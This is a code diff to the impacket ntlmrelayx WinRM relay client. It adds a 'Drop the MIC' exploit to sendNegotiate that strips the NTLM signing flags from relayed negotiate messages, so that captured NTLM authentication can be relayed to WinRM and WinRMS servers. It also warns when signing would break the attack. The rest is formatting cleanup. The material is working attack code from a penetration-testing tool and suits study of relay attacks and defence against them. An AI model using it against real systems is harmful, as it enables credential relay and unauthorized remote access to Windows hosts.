@@ -26,7 +26,7 @@ from struct import unpack
 from impacket import LOG
 from impacket.examples.ntlmrelayx.clients import ProtocolClient
 from impacket.nt_errors import STATUS_SUCCESS, STATUS_ACCESS_DENIED
-from impacket.ntlm import NTLMAuthChallenge
+from impacket.ntlm import NTLMAuthChallenge, NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_SIGN, NTLMSSP_NEGOTIATE_ALWAYS_SIGN
 from impacket.spnego import SPNEGO_NegTokenResp
 
 PROTOCOL_CLIENT_CLASSES = ["WinRMRelayClient", "WinRMSRelayClient"]
@@ -34,7 +34,7 @@ PROTOCOL_CLIENT_CLASSES = ["WinRMRelayClient", "WinRMSRelayClient"]
 class WinRMRelayClient(ProtocolClient):
     PLUGIN_NAME = "WINRM"
 
-    def __init__(self, serverConfig, target, targetPort = 5985, extendedSecurity=True ):
+    def __init__(self, serverConfig, target, targetPort = 5985, extendedSecurity=True):
         ProtocolClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)
         self.extendedSecurity = extendedSecurity
         self.negotiateMessage = None
@@ -45,7 +45,7 @@ class WinRMRelayClient(ProtocolClient):
         self.basic_xml_data = "<xml></xml>"
 
     def initConnection(self):
-        self.session = HTTPConnection(self.targetHost,self.targetPort)
+        self.session = HTTPConnection(self.targetHost, self.targetPort)
         self.lastresult = None
         if self.target.path == "":
             self.path = "/wsman"
@@ -53,8 +53,24 @@ class WinRMRelayClient(ProtocolClient):
             self.path = self.target.path
         return True
 
-    def sendNegotiate(self,negotiateMessage):
-       
+    def sendNegotiate(self, negotiateMessage):
+        negoMessage = NTLMAuthNegotiate()
+        negoMessage.fromString(negotiateMessage)
+
+        # Drop the mic exploit
+        # WinRMs servers is configured to use CBT if client requests it which is the case of SMB with NTLMv2 (as I found out quite hard :D)
+        if self.serverConfig.remove_mic:
+            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
+                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
+            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
+                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
+
+        self.negotiateMessage = negoMessage.getData()
+
+        # Warn if the relayed target requests signing, which will break our attack
+        if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
+            LOG.warning('The client requested signing, relaying to WinRMS migh not work!')
+
         headers = {
             "Content-Length": len(self.basic_xml_data),
             "Content-Type": "application/soap+xml;charset=UTF-8"
@@ -377,7 +393,7 @@ class WinRMSRelayClient(WinRMRelayClient):
             self.path = self.target.path
         try:
             uv_context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
-            self.session = HTTPSConnection(self.targetHost,self.targetPort, context=uv_context)
+            self.session = HTTPSConnection(self.targetHost, self.targetPort, context=uv_context)
         except AttributeError:
-            self.session = HTTPSConnection(self.targetHost,self.targetPort)
+            self.session = HTTPSConnection(self.targetHost, self.targetPort)
         return True
